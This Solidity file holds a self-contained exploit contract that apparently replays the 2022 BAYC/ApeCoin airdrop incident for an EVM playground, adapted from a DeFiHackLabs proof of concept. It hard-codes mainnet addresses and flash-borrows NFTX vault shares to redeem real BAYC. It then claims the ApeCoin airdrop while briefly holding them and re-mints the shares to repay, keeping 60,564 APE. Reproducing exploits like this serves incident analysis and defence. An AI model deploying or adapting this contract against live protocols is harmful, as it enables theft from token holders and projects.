// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-05-Bayc_apecoin).
//
// The DeFiHackLabs PoC (test/Bayc_apecoin_exp.sol) runs the attack INLINE in the
// Foundry test contract `ContractTest`: the ERC-3156 `onFlashLoan` callback and
// the `onERC721Received` hook live on the test itself, and the seed BAYC #1060 is
// `transferFrom`-ed in by a `vm.startPrank`'d holder EOA. There is no standalone
// contract to deploy, so the playground cannot point at a real exploit artifact.
//
// This contract is a faithful, self-contained copy of that inline attack: the
// `test()` body becomes `attack()`, and the two callbacks are preserved verbatim.
// Logic and constants are copied from the registry test. It is compiled inside the
// registry forge project (no forge-std / interface.sol imports) so it resolves the
// same on-chain bytecode as the original.
//
// Root cause: ApeCoin's `AirdropGrapesToken.claimTokens()` pays the airdrop based
// on a LIVE `ERC721Enumerable.balanceOf(msg.sender)` of BAYC, with no flash-loan
// awareness and no snapshot. The NFTX BAYC vault is an ERC-3156 flash-lender whose
// share token is 1:1 redeemable for real BAYC, and its `flashLoan` callback is
// unrestricted — so an attacker flash-borrows vault shares, redeems them for real
// BAYC, claims the airdrop while transiently owning those BAYC, then re-mints the
// shares (returning the BAYC) to repay. Net: the vault is made whole, but the
// attacker keeps 60,564 APE.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

interface IBAYC {
    function transferFrom(address from, address to, uint256 tokenId) external;
    function setApprovalForAll(address operator, bool approved) external;
}

interface IAirdrop {
    function claimTokens() external;
}

interface INFTXVault {
    function approve(address spender, uint256 amount) external returns (bool);
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external returns (bool);
    function redeem(uint256 amount, uint256[] calldata specificIds) external returns (uint256[] memory);
    function mint(uint256[] calldata tokenIds, uint256[] calldata amounts) external returns (uint256);
}

contract BaycApecoinDrain {
    address constant BAYC = 0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D;
    address constant NFTX_VAULT = 0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5;
    address constant AIRDROP = 0x025C6da5BD0e6A5dd1350fda9e3B6a614B205a1F;

    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    // The 5 BAYC the attacker flash-redeems from the vault are returned by a random
    // redeem (empty specificIds), so their tokenIds are not known up-front. The PoC
    // records the exact ids from the original trace and re-deposits them together
    // with the seeded #1060 to repay. (The airdrop pays a flat per-BAYC rate, so the
    // specific ids do not affect the payout — only the count of 6 matters.)
    uint256[] private redeemedIds;

    function attack() external {
        // Max-approve the vault's share token so the flashLoan's post-callback
        // allowance check (`allowance(receiver) >= amount + fee`) passes.
        INFTXVault(NFTX_VAULT).approve(NFTX_VAULT, type(uint256).max);
        // Flash-borrow 5.2e18 vault shares (= 5.2 BAYC). The callback redeems 5 real
        // BAYC, claims the airdrop, and re-mints the shares to repay.
        INFTXVault(NFTX_VAULT).flashLoan(address(this), NFTX_VAULT, 5_200_000_000_000_000_000, "");
    }

    function onFlashLoan(address, address, uint256, uint256, bytes memory) external returns (bytes32) {
        uint256[] memory blank = new uint256[](0);
        // Burn 5e18 of the borrowed shares; the vault transfers 5 real BAYC out.
        // Together with the seeded #1060, the attacker now owns 6 BAYC.
        redeemedIds = INFTXVault(NFTX_VAULT).redeem(5, blank);

        // Owning 6 BAYC at this instant lets the attacker claim 6 × 10,094 = 60,564 APE.
        IAirdrop(AIRDROP).claimTokens();

        // Allow the vault to pull all 6 BAYC back during the re-mint below.
        IBAYC(BAYC).setApprovalForAll(NFTX_VAULT, true);

        // Re-deposit all 6 BAYC (the 5 redeemed + #1060): mints 6e18 shares back,
        // covering the 5 burned above and repaying the flash principal + fee.
        uint256[] memory nfts = new uint256[](6);
        nfts[0] = redeemedIds[0];
        nfts[1] = redeemedIds[1];
        nfts[2] = redeemedIds[2];
        nfts[3] = redeemedIds[3];
        nfts[4] = redeemedIds[4];
        nfts[5] = 1060;
        INFTXVault(NFTX_VAULT).mint(nfts, blank);

        // Re-approve so the vault can burn principal + fee after the callback returns.
        INFTXVault(NFTX_VAULT).approve(NFTX_VAULT, type(uint256).max);

        return CALLBACK_SUCCESS;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
